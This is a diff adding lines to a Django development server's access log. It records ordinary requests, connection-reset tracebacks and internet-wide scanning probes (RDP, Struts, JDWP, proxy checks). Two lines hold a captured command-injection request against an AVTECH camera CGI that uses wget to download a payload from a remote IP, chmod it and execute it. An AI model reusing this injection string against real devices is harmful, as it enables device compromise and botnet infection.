@@ -1514,3 +1514,167 @@ Not Found: /favicon.ico
 [30/Oct/2018 21:06:42] "GET /crawling/pictures/?name=%EC%95%88%EC%95%94 HTTP/1.1" 200 3959
 Not Found: /status
 [30/Oct/2018 21:44:23] "GET /status HTTP/1.1" 404 2226
+Not Found: /cgi-bin/nobody/Search.cgi
+[31/Oct/2018 04:41:07] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 404 2525
+Not Found: /
+[31/Oct/2018 05:19:05] "GET / HTTP/1.0" 404 2187
+Not Found: /favicon.ico
+[31/Oct/2018 13:17:20] "GET /favicon.ico HTTP/1.1" 404 2241
+----------------------------------------
+Exception happened during processing of request from ('82.202.209.155', 60000)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 651, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 721, in __init__
+    self.handle()
+  File "/home/pospot/Env/pospot/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('82.202.209.156', 60000)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 651, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 721, in __init__
+    self.handle()
+  File "/home/pospot/Env/pospot/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[01/Nov/2018 07:37:25] "GET / HTTP/1.1" 404 2190
+Not Found: /status
+[01/Nov/2018 11:01:04] "GET /status HTTP/1.1" 404 2226
+Not Found: /cgi-bin/nobody/Search.cgi
+[01/Nov/2018 14:49:42] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 404 2525
+Not Found: /
+[02/Nov/2018 03:54:37] "GET / HTTP/1.1" 404 2190
+Not Found: /
+[02/Nov/2018 09:30:03] "GET / HTTP/1.1" 404 2190
+[02/Nov/2018 12:39:07] "HEAD /crawling/tagnum/?name1=%EA%B2%BD%EB%B3%B5%EA%B6%81&name2=%EB%B6%88%EA%B5%AD%EC%82%AC&name3=%EC%84%9D%EA%B5%B4%EC%95%94&name4=%ED%95%9C%EA%B0%95&name5=%EB%B9%B5%EA%BE%B8 HTTP/1.1" 200 146
+[02/Nov/2018 12:39:07] "GET /crawling/tagnum/?name1=%EA%B2%BD%EB%B3%B5%EA%B6%81&name2=%EB%B6%88%EA%B5%AD%EC%82%AC&name3=%EC%84%9D%EA%B5%B4%EC%95%94&name4=%ED%95%9C%EA%B0%95&name5=%EB%B9%B5%EA%BE%B8 HTTP/1.1" 200 146
+[02/Nov/2018 16:50:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[02/Nov/2018 16:50:20] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /
+[02/Nov/2018 22:57:53] "GET / HTTP/1.1" 404 2190
+Not Found: /favicon.ico
+[02/Nov/2018 22:57:53] "GET /favicon.ico HTTP/1.1" 404 2241
+Not Found: /tagnum
+[02/Nov/2018 22:57:54] "GET /tagnum?name=paris HTTP/1.1" 404 2237
+Not Found: /favicon.ico
+[02/Nov/2018 22:57:55] "GET /favicon.ico HTTP/1.1" 404 2241
+Not Found: /
+[03/Nov/2018 05:39:06] "GET / HTTP/1.1" 404 2190
+Not Found: /status
+[03/Nov/2018 07:42:39] "GET /status HTTP/1.1" 404 2226
+Not Found: /
+[03/Nov/2018 15:12:55] "GET / HTTP/1.1" 404 2185
+Not Found: /favicon.ico
+[03/Nov/2018 15:12:56] "GET /favicon.ico HTTP/1.1" 404 2241
+Not Found: /
+[03/Nov/2018 17:52:12] "GET / HTTP/1.1" 404 2190
+Not Found: /struts2-rest-showcase/orders.xhtml
+[04/Nov/2018 13:35:39] "GET /struts2-rest-showcase/orders.xhtml HTTP/1.1" 404 2310
+Not Found: /index.action
+[04/Nov/2018 13:35:39] "GET /index.action HTTP/1.1" 404 2244
+Not Found: /index.do
+[04/Nov/2018 13:35:40] "GET /index.do HTTP/1.1" 404 2232
+Not Found: /
+[04/Nov/2018 15:50:42] "GET / HTTP/1.1" 404 2190
+----------------------------------------
+Exception happened during processing of request from ('185.197.74.218', 57604)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 651, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 721, in __init__
+    self.handle()
+  File "/home/pospot/Env/pospot/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[04/Nov/2018 20:40:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[04/Nov/2018 20:40:20] "  *%à     Cookie: mstshash=Test" 400 -
+[04/Nov/2018 20:40:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[04/Nov/2018 20:40:21] "  *%à     Cookie: mstshash=Test" 400 -
+Not Found: /www.yahoo.com:443
+[05/Nov/2018 06:25:58] "CONNECT www.yahoo.com:443 HTTP/1.0" 404 1663
+[05/Nov/2018 06:26:08] code 400, message Bad request syntax ('\x04\x01\x01»\x00\x00\x00\x01\x00www.yahoo.com\x00')
+[05/Nov/2018 06:26:08] "»    www.yahoo.com " 400 -
+Not Found: /http:/www.ip138.com/
+[06/Nov/2018 01:57:13] "GET http://www.ip138.com/ HTTP/1.1" 404 1669
+[06/Nov/2018 06:09:26] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[06/Nov/2018 06:09:26] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+Not Found: /
+[06/Nov/2018 15:38:37] "GET / HTTP/1.1" 404 2190
+[06/Nov/2018 19:44:33] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[06/Nov/2018 19:44:33] "    c                           " 400 -
+[07/Nov/2018 03:50:14] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[07/Nov/2018 03:50:14] "    c                           " 400 -
+[07/Nov/2018 07:49:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[07/Nov/2018 07:49:55] "  +&à     Cookie: mstshash=hello" 400 -
+[07/Nov/2018 11:59:34] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[07/Nov/2018 11:59:34] "    c                           " 400 -
+Not Found: /
+[07/Nov/2018 15:29:53] "GET / HTTP/1.1" 404 2185
+Not Found: /status
+[07/Nov/2018 22:56:51] "GET /status HTTP/1.1" 404 2226
+Not Found: /
+[07/Nov/2018 23:58:37] "GET / HTTP/1.0" 404 2187
+Not Found: /
+[08/Nov/2018 03:18:01] "GET / HTTP/1.1" 404 2190
+[08/Nov/2018 10:10:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[08/Nov/2018 10:10:19] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /status
+[08/Nov/2018 10:17:10] "GET /status HTTP/1.1" 404 2226
+Not Found: /
+[08/Nov/2018 13:32:23] "GET / HTTP/1.1" 404 2190
+[08/Nov/2018 15:48:33] code 400, message Bad HTTP/0.9 request type ('JDWP-Handshake\x00\x00\x00')
+[08/Nov/2018 15:48:33] "JDWP-Handshake       " 400 -
+Not Found: /
+[08/Nov/2018 23:39:37] "GET / HTTP/1.1" 404 2185
+Not Found: /favicon.ico
+[08/Nov/2018 23:39:38] "GET /favicon.ico HTTP/1.1" 404 2241
+Not Found: /www.yahoo.com:443
+[09/Nov/2018 04:16:04] "CONNECT www.yahoo.com:443 HTTP/1.0" 404 1663
+[09/Nov/2018 04:16:14] code 400, message Bad request syntax ('\x04\x01\x01»\x00\x00\x00\x01\x00www.yahoo.com\x00')
+[09/Nov/2018 04:16:14] "»    www.yahoo.com " 400 -
+[09/Nov/2018 04:45:07] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[09/Nov/2018 04:45:07] "    c                           " 400 -
+[09/Nov/2018 04:55:48] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[09/Nov/2018 04:55:48] "    c                           " 400 -
+----------------------------------------
+Exception happened during processing of request from ('92.53.76.210', 60000)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 651, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 721, in __init__
+    self.handle()
+  File "/home/pospot/Env/pospot/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /status
+[09/Nov/2018 21:08:44] "GET /status HTTP/1.1" 404 2226
+Not Found: /
+[09/Nov/2018 22:43:09] "GET / HTTP/1.1" 404 2190
+Not Found: /
+[09/Nov/2018 23:18:07] "GET / HTTP/1.1" 404 2185
+Not Found: /favicon.ico
+[09/Nov/2018 23:18:10] "GET /favicon.ico HTTP/1.1" 404 2241
